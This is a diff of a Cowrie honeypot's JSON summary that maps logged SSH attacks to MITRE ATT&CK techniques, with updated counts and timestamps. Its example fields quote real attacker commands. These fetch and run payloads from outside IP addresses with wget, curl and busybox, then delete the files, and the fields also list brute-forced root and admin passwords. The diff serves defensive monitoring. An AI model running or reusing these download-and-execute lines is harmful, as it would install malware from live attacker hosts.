@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-25 22:04:12",
+  "generated": "2026-08-25 23:02:47",
   "totals": {
-    "commands": 2132,
-    "login_failed": 3175,
-    "login_success": 643,
-    "sessions": 3741
+    "commands": 2134,
+    "login_failed": 3219,
+    "login_success": 645,
+    "sessions": 3792
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3175,
+      "count": 3219,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / Password1"
       ],
       "first": "2026-08-25T00:00:38.643564Z",
-      "last": "2026-08-25T22:03:31.397684Z",
-      "unique_ips": 204
+      "last": "2026-08-25T23:00:59.119187Z",
+      "unique_ips": 213
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 643,
+      "count": 645,
       "examples": [
         "root / root",
         "root / neworangetech",
@@ -37,8 +37,8 @@
         "admin / 1234"
       ],
       "first": "2026-08-25T00:17:08.525783Z",
-      "last": "2026-08-25T21:59:17.976840Z",
-      "unique_ips": 79
+      "last": "2026-08-25T23:01:51.097618Z",
+      "unique_ips": 81
     },
     {
       "id": "T1105",
@@ -60,7 +60,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 91,
+      "count": 92,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,14 +69,14 @@
         "curl http://176.65.139.202:80/telnet.sh -o /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh"
       ],
       "first": "2026-08-25T01:41:49.523664Z",
-      "last": "2026-08-25T21:59:19.705179Z",
-      "unique_ips": 16
+      "last": "2026-08-25T23:01:52.181973Z",
+      "unique_ips": 17
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 29,
+      "count": 31,
       "examples": [
         "uname -m",
         "uname -a",
@@ -85,14 +85,14 @@
         "/bin/./uname -s -v -n -r -m"
       ],
       "first": "2026-08-25T01:53:08.258780Z",
-      "last": "2026-08-25T21:39:26.367125Z",
-      "unique_ips": 16
+      "last": "2026-08-25T23:01:52.181973Z",
+      "unique_ips": 17
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 10,
+      "count": 11,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -100,35 +100,35 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-25T01:41:49.523664Z",
-      "last": "2026-08-25T21:24:49.776581Z",
-      "unique_ips": 4
+      "last": "2026-08-25T23:01:52.181973Z",
+      "unique_ips": 5
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 8,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id"
       ],
       "first": "2026-08-25T03:20:06.918065Z",
-      "last": "2026-08-25T21:47:47.721687Z",
-      "unique_ips": 6
+      "last": "2026-08-25T23:01:52.181973Z",
+      "unique_ips": 7
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 6,
+      "count": 7,
       "examples": [
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-25T01:41:49.659882Z",
-      "last": "2026-08-25T21:24:49.776581Z",
-      "unique_ips": 3
+      "last": "2026-08-25T23:01:52.181973Z",
+      "unique_ips": 4
     },
     {
       "id": "T1057",
